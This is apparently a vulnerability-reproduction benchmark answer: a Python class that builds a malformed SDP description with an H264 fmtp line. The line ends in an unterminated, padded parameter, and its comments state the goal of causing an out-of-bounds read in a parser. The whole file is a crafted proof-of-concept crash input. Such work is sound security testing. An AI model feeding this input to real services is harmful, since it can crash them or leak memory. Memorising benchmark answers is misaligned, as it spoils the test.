class Solution:
    def solve(self, src_path: str) -> bytes:
        sdp = []
        sdp.append("v=0")
        sdp.append("o=- 0 0 IN IP4 127.0.0.1")
        sdp.append("s=-")
        sdp.append("c=IN IP4 127.0.0.1")
        sdp.append("t=0 0")
        sdp.append("m=video 5004 RTP/AVP 96")
        sdp.append("a=rtpmap:96 H264/90000")
        # Construct an fmtp line where the final parameter lacks '=' and ends at EOF
        base_params = (
            "profile-level-id=42e01f;"
            "packetization-mode=1;"
            "sprop-parameter-sets=Z0IAH+KQFAe2Atw==,aM4GAAAAwA==;"
            "max-mbps=11880;"
            "level-asymmetry-allowed=1;"
            "x-google-start-bitrate=800000;"
            "x-google-max-bitrate=2000000;"
            "x-google-min-bitrate=300000;"
        )
        # Final parameter without '=' and without trailing semicolon; ensure it's the last token
        broken_tail = "brokenparam" + ("X" * 600)
        fmtp_line = "a=fmtp:96 " + base_params + broken_tail
        sdp.append(fmtp_line)
        # Join using CRLF, do NOT add a newline after the final fmtp line to maximize OOB read
        data = "\r\n".join(sdp)
        return data.encode("ascii", errors="ignore")
